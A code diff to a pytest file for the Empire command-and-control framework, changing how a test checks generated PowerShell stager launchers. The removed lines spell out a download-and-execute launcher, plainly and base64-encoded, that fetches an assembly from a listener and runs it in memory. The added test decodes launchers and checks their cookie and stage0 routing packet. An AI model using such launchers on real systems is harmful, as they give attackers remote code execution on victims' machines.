@@ -5,6 +5,7 @@ from pathlib import Path
 
 import pytest
 
+from empire.server.common import packets
 from empire.server.common.empire import MainMenu
 from empire.server.stagers.multi.generate_agent import Stager
 from empire.server.utils.file_util import run_as_user
@@ -44,23 +45,13 @@ def test_generate_launcher(stager_generation_service):
 
 
 @pytest.mark.parametrize(
-    ("obfuscate", "encode", "expected_launcher"),
+    ("obfuscate", "encode"),
     [
-        (
-            False,
-            False,
-            """$wc=New-Object System.Net.WebClient;$bytes=$wc.DownloadData("http://localhost:1336/download/powershell/");$assembly=[Reflection.Assembly]::load($bytes);$assembly.EntryPoint.Invoke($null,$null);""",
-        ),
-        (
-            False,
-            True,
-            "powershell -noP -sta -w 1 -enc  JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABiAHkAdABlAHMAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAIgBoAHQAdABwADoALwAvAGwAbwBjAGEAbABoAG8AcwB0ADoAMQAzADMANgAvAGQAbwB3AG4AbABvAGEAZAAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALwAiACkAOwAkAGEAcwBzAGUAbQBiAGwAeQA9AFsAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBsAG8AYQBkACgAJABiAHkAdABlAHMAKQA7ACQAYQBzAHMAZQBtAGIAbAB5AC4ARQBuAHQAcgB5AFAAbwBpAG4AdAAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAJABuAHUAbABsACkAOwA=",
-        ),
+        (False, False),
+        (False, True),
     ],
 )
-def test_generate_exe_oneliner(
-    stager_generation_service, obfuscate, encode, expected_launcher
-):
+def test_generate_exe_oneliner(stager_generation_service, obfuscate, encode):
     launcher = stager_generation_service.generate_exe_oneliner(
         language="powershell",
         obfuscate=obfuscate,
@@ -68,7 +59,50 @@ def test_generate_exe_oneliner(
         encode=encode,
         listener_name="new-listener-1",
     )
-    assert expected_launcher in launcher
+
+    listener = stager_generation_service.listener_service.get_active_listener_by_name(
+        "new-listener-1"
+    )
+    cookie_name = listener.options["Cookie"]["Value"]
+    staging_key = listener.options["StagingKey"]["Value"]
+
+    def decoded_powershell_if_needed(text: str) -> str:
+        m = re.search(r"-enc\s+([A-Za-z0-9+/=]+)", text)
+        if not m:
+            return text
+        raw = base64.b64decode(m.group(1))
+        return raw.decode("utf-16le", errors="strict")
+
+    ps = decoded_powershell_if_needed(launcher)
+
+    # Invariants: the launcher should set the Cookie and download stage0
+    assert "System.Net.WebClient" in ps
+    assert 'Headers.Add("Cookie",' in ps
+    assert "DownloadData(" in ps
+
+    # Extract the cookie header value:  Cookie","<cookie_name>=<base64_routing_packet>"
+    cookie_re = re.compile(
+        r'Headers\.Add\("Cookie","' + re.escape(cookie_name) + r"=([^\";]+)\"\)"
+    )
+    m = cookie_re.search(ps)
+    assert m, f"Cookie header not found or not in expected format. Script was: {ps}"
+
+    b64_routing_packet = m.group(1)
+
+    # Base64 must decode, and routing packet must be the expected invariant size here (encData is "")
+    routing_packet = base64.b64decode(b64_routing_packet, validate=True)
+    assert len(routing_packet) == 44  # noqa: PLR2004 12-byte nonce + 32-byte chacha20poly1305 blob
+
+    # Decrypt + parse routing packet and validate invariant fields
+    parsed = packets.parse_routing_packet(staging_key, routing_packet)
+    assert parsed is not None
+    assert "00000000" in parsed
+
+    language, meta, additional, enc_data = parsed["00000000"]
+    assert language == "POWERSHELL"
+    assert meta == "STAGE0"
+    assert additional == "NONE"
+    assert enc_data == b""
 
 
 @pytest.mark.parametrize(
